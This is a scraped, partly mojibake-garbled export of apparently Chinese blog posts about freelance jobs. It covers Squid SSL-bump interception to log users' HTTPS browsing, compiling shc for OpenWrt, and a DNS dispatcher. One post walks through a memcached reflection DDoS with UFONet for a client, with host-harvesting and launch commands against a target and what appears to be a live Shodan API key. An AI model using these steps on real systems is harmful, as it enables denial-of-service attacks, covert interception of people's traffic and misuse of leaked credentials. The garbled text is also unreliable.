apt-get install build-essential fakeroot devscripts gawk gcc-multilib dpatch 2sudo apt-get build-dep squid3 3sudo apt-get build-dep openssl 4sudo apt-get install libssl-dev 5sudo apt-get source squid3 ä¸‹è½½åˆ°squidçš„æºä»£ç ï¼Œä»¥åŠubuntuçš„ä¿®æ”¹åŒ…ï¼Œè§£å‹å¹¶é‡Šæ”¾ï¼š\n1tar zxvf squid3_3.5.12.orig.tar.gz 2cd squid3-3.5.12 3tar xf ../squid3_3.5.12-1ubuntu7.5.debian.tar.xz ä¿®æ”¹å‚æ•°å¢åŠ å¯¹sslçš„æ”¯æŒï¼š\n1vi debian/rules 2Add --with-openssl --enable-ssl --enable-ssl-crtd under the DEB_CONFIGURE_EXTRA_FLAGS section. 3 4DEB_CONFIGURE_EXTRA_FLAGS := BUILDCXXFLAGS=\u0026#34;$(CXXFLAGS) $(LDFLAGS)\u0026#34; \\ 5... 6 --with-default-user=proxy \\ 7 --with-openssl \\ 8 --enable-ssl \\ 9 --enable-ssl-crtd 10... ç¼–è¯‘ï¼Œä¼šç”Ÿæˆ7ä¸ªdebåŒ…\n1debuild -us -uc -b 2cd .. 3ls -1 *.deb 4squid3_3.5.12-1ubuntu7.5_all.deb 5squid_3.5.12-1ubuntu7.5_amd64.deb 6squid-cgi_3.5.12-1ubuntu7.5_amd64.deb 7squidclient_3.5.12-1ubuntu7.5_amd64.deb 8squid-common_3.5.12-1ubuntu7.5_all.deb 9squid-dbg_3.5.12-1ubuntu7.5_amd64.deb 10squid-purge_3.5.12-1ubuntu7.5_amd64.deb å®‰è£…ï¼Œå…ˆè£…è¯­è¨€åŒ…ï¼Œç„¶åå®‰è£…ä¸‰ä¸ªè‡ªå·±ç”Ÿæˆçš„åŒ…\n1sudo apt-get install squid-langpack 2sudo dpkg -i squid_3.5.12-1ubuntu7.5_amd64.deb squid-common_3.5.12-1ubuntu7.5_all.deb squid-dbg_3.5.12-1ubuntu7.5_amd64.deb æ£€æŸ¥ä¸€ä¸‹æ–°çš„squidæ˜¯å¦æ”¯æŒssläº†\n1squid -v|grep ssl 2configure options: \u0026#39;--build=x86_64-linux-gnu\u0026#39; \u0026#39;--prefix=/usr\u0026#39; \u0026#39;--includedir=${prefix}/include\u0026#39; \u0026#39;--mandir=${prefix}/share/man\u0026#39; \u0026#39;--infodir=${prefix}/share/info\u0026#39; \u0026#39;--sysconfdir=/etc\u0026#39; \u0026#39;--localstatedir=/var\u0026#39; \u0026#39;--libexecdir=${prefix}/lib/squid3\u0026#39; \u0026#39;--srcdir=.\u0026#39; \u0026#39;--disable-maintainer-mode\u0026#39; \u0026#39;--disable-dependency-tracking\u0026#39; \u0026#39;--disable-silent-rules\u0026#39; \u0026#39;BUILDCXXFLAGS=-g -O2 -fPIE -fstack-protector-strong -Wformat -Werror=format-security -Wl,-Bsymbolic-functions -fPIE -pie -Wl,-z,relro -Wl,-z,now\u0026#39; \u0026#39;--datadir=/usr/share/squid\u0026#39; \u0026#39;--sysconfdir=/etc/squid\u0026#39; \u0026#39;--libexecdir=/usr/lib/squid\u0026#39; \u0026#39;--mandir=/usr/share/man\u0026#39; \u0026#39;--enable-inline\u0026#39; \u0026#39;--disable-arch-native\u0026#39; \u0026#39;--enable-async-io=8\u0026#39; \u0026#39;--enable-storeio=ufs,aufs,diskd,rock\u0026#39; \u0026#39;--enable-removal-policies=lru,heap\u0026#39; \u0026#39;--enable-delay-pools\u0026#39; \u0026#39;--enable-cache-digests\u0026#39; \u0026#39;--enable-icap-client\u0026#39; \u0026#39;--enable-follow-x-forwarded-for\u0026#39; \u0026#39;--enable-auth-basic=DB,fake,getpwnam,LDAP,NCSA,NIS,PAM,POP3,RADIUS,SASL,SMB\u0026#39; \u0026#39;--enable-auth-digest=file,LDAP\u0026#39; \u0026#39;--enable-auth-negotiate=kerberos,wrapper\u0026#39; \u0026#39;--enable-auth-ntlm=fake,smb_lm\u0026#39; \u0026#39;--enable-external-acl-helpers=file_userip,kerberos_ldap_group,LDAP_group,session,SQL_session,unix_group,wbinfo_group\u0026#39; \u0026#39;--enable-url-rewrite-helpers=fake\u0026#39; \u0026#39;--enable-eui\u0026#39; \u0026#39;--enable-esi\u0026#39; \u0026#39;--enable-icmp\u0026#39; \u0026#39;--enable-zph-qos\u0026#39; \u0026#39;--enable-ecap\u0026#39; \u0026#39;--disable-translation\u0026#39; \u0026#39;--with-swapdir=/var/spool/squid\u0026#39; \u0026#39;--with-logdir=/var/log/squid\u0026#39; \u0026#39;--with-pidfile=/var/run/squid.pid\u0026#39; \u0026#39;--with-filedescriptors=65536\u0026#39; \u0026#39;--with-large-files\u0026#39; \u0026#39;--with-default-user=proxy\u0026#39; \u0026#39;--with-openssl\u0026#39; \u0026#39;--enable-ssl\u0026#39; \u0026#39;--enable-ssl-crtd\u0026#39; \u0026#39;--enable-build-info=Ubuntu linux\u0026#39; \u0026#39;--enable-linux-netfilter\u0026#39; \u0026#39;build_alias=x86_64-linux-gnu\u0026#39; \u0026#39;CFLAGS=-g -O2 -fPIE -fstack-protector-strong -Wformat -Werror=format-security -Wall\u0026#39; \u0026#39;LDFLAGS=-Wl,-Bsymbolic-functions -fPIE -pie -Wl,-z,relro -Wl,-z,now\u0026#39; \u0026#39;CPPFLAGS=-Wdate-time -D_FORTIFY_SOURCE=2\u0026#39; \u0026#39;CXXFLAGS=-g -O2 -fPIE -fstack-protector-strong -Wformat -Werror=format-security\u0026#39; 3 4cd /usr/lib/squid 5ls ssl_crtd Genå‡ºsslçš„è¯ä¹¦å’Œå¯†é’¥å¹¶æ‹·è´åˆ°æ­£ç¡®çš„ä½ç½®ï¼Œæ›´æ–°ca-certificatesï¼š\n1openssl genrsa -out squid.key 2048 2 3openssl req -new -key squid.key -out squid.csr 4You are about to be asked to enter information that will be incorporated 5into your certificate request. 6What you are about to enter is what is called a Distinguished Name or a DN. 7There are quite a few fields but you can leave some blank 8For some fields there will be a default value, 9If you enter \u0026#39;.\u0026#39;, the field will be left blank. 10----- 11Country Name (2 letter code) [AU]:CN 12State or Province Name (full name) [Some-State]:Beijing 13Locality Name (eg, city) []:Beijing 14Organization Name (eg, company) [Internet Widgits Pty Ltd]:Rendoumi.com 15Organizational Unit Name (eg, section) []:Rendoumi.com 16Common Name (e.g. server FQDN or YOUR name) []:159.89.116.192 17Email Address []: 18 19Please enter the following \u0026#39;extra\u0026#39; attributes 20to be sent with your certificate request 21A challenge password []: 22An optional company name []: 23 24 25openssl x509 -req -days 3650 -in squid.csr -signkey squid.key -out squid.crt 26Signature ok 27subject=/C=CN/ST=Beijing/L=Beijing/O=Rendoumi.com/OU=Rendoumi.com/CN=159.89.116.192 28Getting Private key 29 30sudo cp squid.crt /usr/local/share/ca-certificates 31 32sudo /usr/sbin/update-ca-certificates 33Updating certificates in /etc/ssl/certs... 341 added, 0 removed; done. 35Running hooks in /etc/ca-certificates/update.d... 36done. 37 38sudo cp squid.pem /etc/squid ä¿®æ”¹/etc/squid.confé…ç½®æ–‡ä»¶\n1cd /etc/squid 2cat squid.conf|grep -v ^# | grep -v ^$ 3 4sudo vi /etc/squid/squid.conf 5---------------------------------------- 6acl SSL_ports port 443 7acl Safe_ports port 80 # http 8acl Safe_ports port 21 # ftp 9acl Safe_ports port 443 # https 10acl Safe_ports port 70 # gopher 11acl Safe_ports port 210 # wais 12acl Safe_ports port 1025-65535 # unregistered ports 13acl Safe_ports port 280 # http-mgmt 14acl Safe_ports port 488 # gss-http 15acl Safe_ports port 591 # filemaker 16acl Safe_ports port 777 # multiling http 17acl CONNECT method CONNECT 18acl localnet src 10.8.0.0/16 19 20http_access deny !Safe_ports 21http_access deny CONNECT !SSL_ports 22 23http_access allow localhost manager 24http_access deny manager 25 26http_access allow localhost 27http_access allow localnet 28http_access deny all 29 30coredump_dir /var/spool/squid 31 32refresh_pattern ^ftp: 1440 20% 10080 33refresh_pattern ^gopher: 1440 0% 1440 34refresh_pattern -i (/cgi-bin/|\\?) 0 0% 0 35refresh_pattern (Release|Packages(.gz)*)$ 0 20% 2880 36# example lin deb packages 37#refresh_pattern (\\.deb|\\.udeb)$ 129600 100% 129600 38refresh_pattern . 0 20% 4320 39 40shutdown_lifetime 3 41 42http_port 3128 intercept 43https_port 3129 intercept ssl-bump generate-host-certificates=on version=1 options=NO_SSLv2,NO_SSLv3,SINGLE_DH_USE dynamic_cert_mem_cache_size=4MB cert=/etc/squid/squid.pem 44 45always_direct allow all 46ssl_bump none localhost 47ssl_bump server-first all 48sslproxy_cert_error allow all 49sslproxy_flags DONT_VERIFY_PEER 50sslcrtd_program /usr/lib/squid/ssl_crtd -s /var/lib/ssl_db -M 4MB 51sslcrtd_children 8 startup=1 idle=1 52---------------------------------------- åˆå§‹åŒ–ssl_db\n1sudo /usr/lib/squid/ssl_crtd -c -s /var/lib/ssl_db/ 2chown -R proxy /var/lib/ssl_db é‡å¯squid\n1sudo systemctl restart squid.service ç‰¹åˆ«çš„ä¸€ç‚¹ï¼Œé›‡ä¸»å†™äº†å·¨å¤šçš„ufwçš„è§„åˆ™ï¼Œå¯¼è‡´IPTABLEçˆ†æ»¡ï¼Œå±…ç„¶æ— æ³•æ‰‹åŠ¨æ¸…é™¤æ‰€æœ‰çš„è§„åˆ™ï¼Œè¿™ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°è¿™æ ·çš„ï¼Œåªèƒ½å†™è„šæœ¬æ¸…é™¤ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š\n1vi cl.txt 2----------------------- 3# Empty the entire filter table 4*filter 5:INPUT ACCEPT [0:0] 6:FORWARD ACCEPT [0:0] 7:OUTPUT ACCEPT [0:0] 8COMMIT 9----------------------- 10 11sudo iptables-restore \u0026lt; cl æœ€åä¿®æ”¹IPTABLESï¼ŒæŠŠ80å’Œ443çš„è¯·æ±‚éƒ½é€åˆ°squidå»\n1sudo vi /etc/rc.local 2iptables -t nat -A PREROUTING -p tcp -s 10.8.0.0/24 --dport 80 -j REDIRECT --to-ports 3128 3iptables -t nat -A PREROUTING -p tcp -s 10.8.0.0/24 --dport 443 -j REDIRECT --to-ports 3129 4iptables -t nat -A POSTROUTING -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to 159.89.116.192 ç”¨ä»£ç†è®¿é—®ï¼ŒéªŒè¯ä¸€ä¸‹ï¼š\n1sudo tail -f /var/log/squid/access.log è¿™æ ·åšæœ‰ä¸ªé—®é¢˜ï¼Œå°±æ˜¯httpså®é™…æ˜¯è¢«åŠ«æŒä»£ç†äº†ï¼Œæ‰€ä»¥å®¢æˆ·ç«¯ä¼šå¼¹å‡ºä¸ªæ˜¯å¦ä¿¡ä»»è¯ä¹¦ï¼Œé™¤éåœ¨æ¯ä¸ªå®¢æˆ·ç«¯ä¸­é¢„åŸ‹ï¼Œè¿™æ ·æ‰èƒ½è§£å†³ã€‚\nThat is all.\n","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-freelancer_4/","series":null,"tags":null,"title":"Freelancerä»»åŠ¡ä¹‹å››squidæŸ¥è¯¢ç”¨æˆ·æµè§ˆè®°å½•"},{"categories":null,"content":"è¿™ä¸ªä»»åŠ¡å¾ˆæœ‰æ„æ€\nä»»åŠ¡æè¿°ï¼š\n1we need a set of vpn server / client programmed for embedded linux (or windows) 2to bond multiple 4g lte modems or wifi connectios and stitch them back together 3on server side to stream video feeds. the connection must be stable and have 4the maximum available bandwidth with no drop in some connection drops. 5simillar to service called SPEEDIFY (but it doesn\u0026#39;t work well) 6 7this can be also achieved by splitting video packets and send them through 8 different links and stitch the video packets back on the server side. ç®€å•è¯´ï¼Œå¾ˆå¯èƒ½å®ƒè¿™è¾¹æ˜¯ä¸ªåµŒå…¥å¼ç³»ç»Ÿï¼Œæ ‘è“æ´¾ã€nanopiä¹‹æµçš„ï¼Œæ¥äº†4Gçš„æ— çº¿ä¸Šç½‘å¡ï¼Œæƒ³å»èšåˆé“¾è·¯ä¸Šä¼ æµåª’ä½“ã€‚\nè§£å†³æ–¹æ¡ˆä¹Ÿå¾ˆç®€å•ï¼Œç›´å‡»ç—›ç‚¹ã€‚\nhttp://vrayo.com/how-to-set-up-a-bonding-vpn-connection-in-linux/ è¿™ä¸ªä»»åŠ¡ï¼š$250 - $750ã€‚\næ²¡ç©ºåšï¼Œä»»åŠ¡ç¼ èº«ã€‚\n","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-freelancer_5/","series":null,"tags":null,"title":"Freelancerä»»åŠ¡ä¹‹äº”å¤šçº¿è·¯èšåˆvpn"},{"categories":null,"content":"è¿™æ˜¯ä¸€æ¬¡å¤±è´¥çš„ä»»åŠ¡ï¼Œå³ä½¿å†æ¥ä¸€æ¬¡ï¼Œä¾ç„¶ä¼šå¤±è´¥ï¼Œå› ä¸ºæ— æ³•éªŒè¯ï¼ŒçœŸå¤Ÿshitçš„ï¼Œæ‰£äº†æˆ‘10$çš„æ‰‹ç»­è´¹ã€‚\nè®°å½•ä¸€ä¸‹ï¼Œä»¥å„†æ•ˆå°¤ã€‚\nä»»åŠ¡å¦‚ä¸‹ï¼š\n1Job would be to compile an ipk file of SHC that would work with LEDE OS (openwrt) and the processor used in our system - will provide details 2 3SHC can be downloaded here: http://www.datsi.fi.upm.es/~frosal/ 4 5I think you must have a 64 bit system to use the SDK to compile the file ç¿»è¯‘ä¸€ä¸‹ï¼šåœ¨OpenWRTå¹³å°ä¸‹ç¼–è¯‘ä¸€ä¸ªSHCï¼Œå¹¶ä¸”èƒ½å·¥ä½œã€‚\nå®Œå…¨æ­¥éª¤å¦‚ä¸‹ï¼š\n1How to compile SHC on LEDE: 2 3Tested build environment: 4 5OS: Ubuntu 14.04.5 LTS 6CPU: ARMv7 Processor rev 5 (v7l) 7 8 9Before you begin, check your system is updated, i.e. 10 11sudo apt-get update 12sudo apt-get upgrade 13sudo apt-get autoremove 14 15 16Step-by-step manual: 17Note: perform all steps as regular (non-root) user. User must be in sudo group. 18 191. Update your sources 20 21sudo apt-get update 22 232. Install nesessary packages: 24 25sudo apt-get install g++ libncurses5-dev zlib1g-dev bison flex unzip autoconf gawk make gettext gcc binutils patch bzip2 libz-dev asciidoc subversion sphinxsearch libtool sphinx-common libssl-dev libssl0.9.8 26 273. Get latest LEDE source from git repository 28 We know our CPU is armv7, it belongs to arm64, so go to http://downloads.lede-project.org/releases , just download sdk. 29 30wget http://downloads.lede-project.org/releases/17.01.4/targets/arm64/generic/lede-sdk-17.01.4-arm64_gcc-5.4.0_musl-1.1.16.Linux-x86_64.tar.xz 31 32 334. No Need to Update and install all LEDE packages 34 We just want to compile shc, not other packages , so don\u0026#39;t update. 35 36 375. Run \u0026#39;make menuconfig\u0026#39; (Just Save and Exit) 38 39 406. Get SHC sources to LEDE package tree 41 (we are and shc-3.8.9b.tgz is in source directory) 42 43wget http://www.datsi.fi.upm.es/~frosal/sources/shc-3.8.9b.tgz 44mkdir -p package/shc/src 45tar xvf shc-3.8.9b.tgz -C package/shc/src --strip-components 1 46 477. Make ipk Makefile 48 49vi package/shc/Makefile 50############################################## 51# OpenWrt Makefile for shc program 52# 53# 54# Most of the variables used here are defined in 55# the include directives below. We just need to 56# specify a basic description of the package, 57# where to build our program, where to find 58# the source files, and where to install the 59# compiled program on the router. 60# 61# Be very careful of spacing in this file. 62# Indents should be tabs, not spaces, and 63# there should be no trailing whitespace in 64# lines that are not commented. 65# 66############################################## 67 68include $(TOPDIR)/rules.mk 69 70# Name and release number of this package 71 72PKG_NAME:=shc 73PKG_VERSION:=3.8.9b 74PKG_MAINTAINER:=Francisco, Rosales, \u0026lt;frosal@fi.upm.es\u0026gt; 75 76 77# This specifies the directory where we\u0026#39;re going to build the program. 78# The root build directory, $(BUILD_DIR), is by default the build_mipsel 79# directory in your OpenWrt SDK directory 80PKG_BUILD_DIR := $(BUILD_DIR)/$(PKG_NAME) 81 82 83include $(INCLUDE_DIR)/package.mk 84 85 86 87# Specify package information for this program. 88# The variables defined here should be self explanatory. 89# If you are running Kamikaze, delete the DESCRIPTION 90# variable below and uncomment the Kamikaze define 91# directive for the description below 92define Package/$(PKG_NAME) 93 SECTION:=utils 94 CATEGORY:=Utilities 95 TITLE:= shc ---- This tool generates a stripped binary executable version of the script specified at command line. 96 URL:=http://www.datsi.fi.upm.es/~frosal 97endef 98 99 100# Uncomment portion below for Kamikaze and delete DESCRIPTION variable above 101define Package/$(PKG_NAME)/description 102 shc ---- This tool generates a stripped binary executable version 103 of the script specified at command line.\u0026#34; 104endef 105 106# Specify what needs to be done to prepare for building the package. 107# In our case, we need to copy the source files to the build directory. 108# This is NOT the default. The default uses the PKG_SOURCE_URL and the 109# PKG_SOURCE which is not defined here to download the source from the web. 110# In order to just build a simple program that we have just written, it is 111# much easier to do it this way. 112define Build/Prepare 113 mkdir -p $(PKG_BUILD_DIR) 114 $(CP) ./src/* $(PKG_BUILD_DIR)/ 115endef 116 117 118# We do not need to define Build/Configure or Build/Compile directives 119# The defaults are appropriate for compiling a simple program such as this one 120 121# Specify where and how to install the program. Since we only have one file, 122# the helloworld executable, install it by copying it to the /bin directory on 123# the router. The $(1) variable represents the root directory on the router running 124# OpenWrt. The $(INSTALL_DIR) variable contains a command to prepare the install 125# directory if it does not already exist. Likewise $(INSTALL_BIN) contains the 126# command to copy the binary file from its current location (in our case the build 127# directory) to the install directory. 128define Package/$(PKG_NAME)/install 129 $(INSTALL_DIR) $(1)/bin 130 $(INSTALL_BIN) $(PKG_BUILD_DIR)/shc $(1)/bin/ 131endef 132 133 134# This line executes the necessary commands to compile our program. 135# The above define directives specify all the information needed, but this 136# line calls BuildPackage which in turn actually uses this information to 137# build a package. 138$(eval $(call BuildPackage,$(PKG_NAME))) 139 140 1418. Compile shc ipk without errors. 142 143make package/shc/compile V=99 144 1459. Building process complete witout errors. 146Now we have : 147binary packages directory: source/bin/packages/aarch64_armv8-a/ 148[SHC_BIN] = ./bin/packages/aarch64_armv8-a/base/shc_3.8.9b_aarch64_armv8-a.ipk 149 15010. Copy and install SHC .ipk to LEDE device. 151 152scp shc_3.8.9b_aarch64_armv8-a.ipk root@\u0026lt;LEDE device IP address or name\u0026gt;:/tmp/ 153ssh root@\u0026lt;LEDE device IP address or name\u0026gt; #IP usually 192.168.1.1 154opkg install shc_3.8.9b_aarch64_armv8-a.ipk 155 15611. Create test script and compile it to execute. (in LEDE shell) 157ssh root@\u0026lt;LEDE device IP address or name\u0026gt; #IP usually 192.168.1.1 158 159vi /tmp/1.sh 160#!/bin/sh 161echo \u0026#34;hahahaha\u0026#34; 162 163shc -v -f /tmp/1.sh 164/tmp/1.sh.x è¿™é‡Œé¢æœ‰å‡ ä¸ªæ³¨æ„ç‚¹ï¼Œä¸€ä¸ªæ˜¯ç½‘ä¸Šæœ‰å¾ˆå¤šæ•™ç¨‹ï¼Œä¸Šå»å°±æ˜¯\n1./scripts/feeds update -a 2./scripts/feeds install -a è¿™ä¸ªåƒä¸‡ä¸è¦ï¼Œè¿™ä¸¤æ¡å‘½ä»¤æ˜¯æŠŠæ‰€æœ‰çš„åº“å’Œè½¯ä»¶éƒ½ç»™ä¸‹è½½ä¸‹æ¥çš„ï¼Œå¦‚æœå†ç¼–è¯‘ï¼ŒåŸºæœ¬åŠå¤©è¿‡å»äº†ï¼Œæµªè´¹æ—¶é—´ç”Ÿå‘½ã€‚æˆ‘ä»¬çš„ç›®æ ‡åªæ˜¯è¦ç¼–è¯‘ä¸ªshcï¼Œå…¶ä»–éƒ½ä¸ç®¡ã€‚\nç¬¬äºŒç‚¹å°±æ˜¯é‚£ä¸ªMakefileï¼Œå…¶å®ç¼–è¯‘shcå°±ä¸€å¥è¯ï¼Œä½†æ˜¯æˆ‘ä»¬è¦æ”¾åˆ°LEDEé‡Œå°±å¿…é¡»æœ‰è¿™ä¸ªMakefile.\nè¿™æ ·å°±é¡ºåˆ©ç¼–è¯‘å‡ºæ¥ä¸ªshc3.8.9baarch64_armv8-a.ipkï¼Œä½†æ˜¯é›‡ä¸»åæ˜ æ‹·ä¸Šå»ä¸èƒ½ç”¨ï¼Œæˆ‘å»ï¼\nè¿™æ‰åˆä»”ç»†ç ”ç©¶shcï¼Œè¿™ä¸ªè½¯ä»¶å…¶å®æ˜¯ä¸ªæ··æ·†çš„è½¯ä»¶ï¼ŒæŠŠshellè„šæœ¬å˜æˆ*.cï¼Œç„¶åå†ç”¨gccç¼–è¯‘æˆ2è¿›åˆ¶æ–‡ä»¶ã€‚\nä½†æ˜¯ä¾OpenWRTçš„æ€§æ ¼ï¼Œä¸€èˆ¬æ ¹æœ¬è£…ä¸ä¸‹gccçš„ï¼Œæ‰€ä»¥å¿…é¡»å¤–æŒ‚Uç›˜è£…GCCä¸Šå»ï¼Œè£…æ³•å¦‚ä¸‹ï¼š\nhttp://www.th7.cn/Program/cp/201708/1224085.shtml éªŒè¯æ–¹æ³•ä¹Ÿæ¯”è¾ƒå¤æ€ªï¼Œé¦–å…ˆå†™å¥½shellï¼Œç„¶åè·‘åˆ°openwrtä¸Šç”¨shcè¿›è¡Œæ··æ·†ï¼Œç„¶åæŠŠæ··æ·†è¿‡çš„.cæ–‡ä»¶æ‹·å‡ºæ¥ï¼Œå†ç”¨gccç¼–è¯‘æˆbinï¼Œç„¶åå†æ‹·å›openwrtè¿è¡ŒéªŒè¯ã€‚\nå†é™„ä¸Šå•ç‹¬ç”¨gccç¼–è¯‘çš„æ–¹æ³•ï¼š\n1export STAGING_DIR=~/LEDE-IPQ40XX$/staging_dir 2cd ~/LEDE-IPQ40XX$ 3./staging_dir/toolchain-arm_cortex-a7+neon-vfpv4_gcc-7.3.0_musl_eabi/bin/arm-openwrt-linux-muslgnueabi-gcc script.sh.x.c -o script.sh.x shitå•Šï¼Œå…¶å®æˆ‘ç¼–è¯‘å‡ºæ¥çš„shcå·²ç»æ˜¯å¯ä»¥è¿è¡Œå¹¶æ··æ·†å‡º*.cçš„ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆarm-gccç¼–è¯‘å‡ºçš„binæ–‡ä»¶åœ¨openwrtä¸Šæ— æ³•è¿è¡Œï¼Œæ›´æ‚²å‰§çš„æ˜¯æˆ‘æ²¡æœ‰ä»–é‚£ä¸ªå¹³å°ï¼Œæ— æ³•è‡ªå·±è£…ä¸ªgccçœ‹çœ‹åˆ°åº•æ˜¯æ€ä¹ˆå›äº‹\næ‚²æƒ¨ä¸–ç•Œå•Šï¼Œè¢«æ‰£äº†10$æ‰‹ç»­è´¹ã€‚\næœ€åé—®äº†é›‡ä¸»ï¼Œä»–åˆæ‰¾äº†ä¸€ä¸ªå®¶ä¼™è§£å†³äº†é—®é¢˜ï¼Œç»™å‡ºçš„æ–¹æ³•å¦‚ä¸‹ï¼š\n19. Compile shell script 2 3${HOME}/shc.sh -r ${HOME}/openwrt-sdk -n hello-world -s ${HOME}/hello-world.sh.x.c; 4ls -lh ${HOME}/openwrt-sdk/bin/packages/arm_cortex-a7_neon-vfpv4/base/script_*; 5ls -lh ${HOME}/openwrt-sdk/build_dir/target-arm_cortex-a7+neon-vfpv4_musl_eabi/hello-world-0.0.1/hello-world; 6 710. Install the script package on OpenWrt. 8 9scp ${HOME}/openwrt/bin/packages/arm_cortex-a7_neon-vfpv4/base/script_* root@192.168.1.1:/tmp/; 10ssh root@192.168.1.1; 11opkg install /tmp/script_*; 12exit; çœ‹æ˜ç™½äº†å§ï¼Œæˆ‘ä¹Ÿæ— æ³•éªŒè¯ï¼Œé æœ‰å¿ƒäººå»è¯•è¯•äº†ã€‚è®°å½•ä¸€ä¸‹ã€‚\n","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124_freelancer_6/","series":null,"tags":null,"title":"Freelancerä»»åŠ¡ä¹‹å…­Compile an Ipk File on Lede (OpenWRT)"},{"categories":null,"content":"è¿™æ˜¯ä¸€æ¬¡å·®ç‚¹èš€æŠŠç±³çš„è¿‡ç¨‹å•Šï¼Œæœ€åäº‰è®®æ‹¿å›äº†è‡ªå·±çš„æ‰‹ç»­è´¹ï¼Œç™½å¹²äº†ä¸€åœºå•Šï¼ŒçœŸå¤Ÿå€’éœ‰çš„ã€‚\néŸ©å›½äººè¦åå°„æ”»å‡»ã€‚\né¦–å…ˆcloneé¡¹ç›®ï¼š\n1git clone https://github.com/epsylon/ufonet åŸç†å¾ˆæ¸…æ¥šï¼Œé€šè¿‡memcacheçš„æ¼æ´ï¼Œmemcacheå±…ç„¶æ˜¯UDPçš„ï¼Œä¼ªé€ æºåœ°å€ï¼Œå‘ä¸€å †è¯·æ±‚åˆ°æœ‰æ¼æ´çš„memchacheï¼Œå¼•èµ·åå°„æ”»å‡»ã€‚\nä¸€å †æœ‰æ¼æ´çš„æœºå™¨ä»å“ªè·å¾—å‘¢ï¼Ÿè¿™ä¸ªéŸ©å›½äººçœŸçš„æœ‰Shodan APIï¼Œæ‰‹æ¦´å¼¹ï¼Ÿ ä»–çš„è´¦å·ï¼Œç¡®å®å¯ä»¥çœ‹åˆ°ä¸€å †æœ‰æ¯›ç—…çš„æœºå™¨\n10ptoLUtmkSJ8DbAvyZ8PevTRsyLoxEuN å®‰è£…python:\n1wget https://www.python.org/ftp/python/2.7.14/Python-2.7.14.tgz 2tar zxvf Python-2.7.14.tgz 3cd Python-2.7.14 4./configure --prefix=/export/servers/Python2714 5make 6make install 7 8wget -O- \u0026#34;https://bootstrap.pypa.io/get-pip.py\u0026#34; | /export/servers/Python2714/bin/python 9 10 11/export/servers/Python2714/bin/pip install pycurl 12/export/servers/Python2714/bin/pip install geoip 13/export/servers/Python2714/bin/pip install whois 14/export/servers/Python2714/bin/pip install crypto 15/export/servers/Python2714/bin/pip install request å…ˆå»æ‹¿ä¸€å †æ¼æ´æœºå™¨çš„åˆ—è¡¨\n1cd ufonet 2/export/servers/Python2714/bin/python ./ufonet --sd \u0026#39;botnet/dorks.txt\u0026#39; --sa è½°å‡»ï¼š\n1/export/servers/Python2714/bin/python ./ufonet./ufonet -a http://target.com -r 10000 --threads 2000 ","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-freelancer_7/","series":null,"tags":null,"title":"Freelancerä»»åŠ¡ä¹‹ä¸ƒmemcache æ”¾å¤§æ”»å‡»"},{"categories":null,"content":"é›‡ä¸»ç»™äº†ä¸ªéš¾é¢˜ï¼Œä»–æ­å»ºäº†ä¸€ä¸ªopenvpnï¼Œå¹¶ä¸”æœ‰ä¸¤ä¸ªDNS Serverï¼Œä¸€ä¸ªæ˜¯å¸¦ADå¹¿å‘Šè¿‡æ»¤çš„ï¼Œä¸€ä¸ªæ˜¯ä¸å¸¦çš„ã€‚è¿™ä¸¤ä¸ªdnsæœåŠ¡åœ¨åŒä¸€ä¸ªæœºå™¨ä¸Šï¼Œç«¯å£ä¸åŒã€‚\nä»–æƒ³è®©åœ¨openvpnçš„clientç«¯é…ç½®ä¸€ä¸‹ï¼Œè®©å®¢æˆ·ä½¿ç”¨ä¸åŒçš„dns serverã€‚\næ‰¾äº†åŠå¤©ï¼Œæ²¡æœ‰èƒ½ä¿®æ”¹dns portçš„é…ç½®ã€‚\näºæ˜¯æ›²çº¿æ•‘å›½ã€‚\næ–¹æ¡ˆå¦‚ä¸‹ï¼šå®¢æˆ·ç«¯å›ºå®šIPï¼Œæ ¹æ®ä¸åŒçš„æ¥æºIPæ¥åˆ†å‘åˆ°ä¸åŒçš„DNSå»ã€‚\næœ¬æ¥æ˜¯æƒ³ç”¨V2EXä¸€ä¸ªå“¥ä»¬è‡ªå·±å†™çš„gliderï¼Œå¼„äº†åŠå¤©ï¼Œä¸çŸ¥é“æ€ä¹ˆé…ï¼Œä¸è¿‡åŠŸèƒ½è‚¯å®šæ˜¯èƒ½å®ç°çš„ã€‚æœ€å·®å°±æ˜¯è‡ªå·±æ”¹goä»£ç äº†ã€‚\nå¿«é€Ÿèµ·è§ï¼Œç”¨äº†å¦å¤–ä¸€ä¸ªå“¥ä»¬çš„dns-dispatcherï¼Œå°±æ˜¯dnsåˆ†å‘ï¼Œglideræ˜¯å½»åº•çš„å„ç§ä»£ç†è½¬å‘ï¼Œé“¾æ¡ä»£ç†ï¼Œéå¸¸å¼ºæ‚ã€‚\nå…‹éš†dns-dispatcherä»£ç \n1git clone https://github.com/cathuhoo/dns-dispatcher ç¼–è¯‘ï¼š\n1make é…ç½®ï¼Œæˆ‘ä»¬åªé…ç½®äº†udpçš„53ç«¯å£ï¼Œæ ‡å‡†çš„DNSç«¯å£\n1vi dns-dispatch.config 2; This is a test configuration file 3 4[main] 5file_resolvers = resolvers.txt 6file_policy = policy.txt 7file_log = /var/log/dns-dispatch.log 8file_pid = /var/run/dns-dispatch.pid 9num_threads = 3 10service_port = 53 11#tcpservice_port = 53 12daemonize = yes é…ç½®ç­–ç•¥ï¼š\n1vi policy.txt 2ip2 | * | Forward:bind2 3ip1 | * | Forward:bind1 é…ç½®ip1å’Œip2\n1vi ip1 210.10.1.2 3 4vi ip2 510.10.1.3 é…ç½®bind1å’Œbind2ï¼Œä¸¤ä¸ªdnsåœ¨10.10.1.1ä¸Šï¼Œç«¯å£åˆ†åˆ«æ˜¯5301å’Œ5302\n1vi resolvers.txt 2bind1|10.10.1.1|5301 3bind2|10.10.1.1|5302 è¿è¡Œï¼š\n1sudo ./dns-dispatch -c dns-dispatch.config 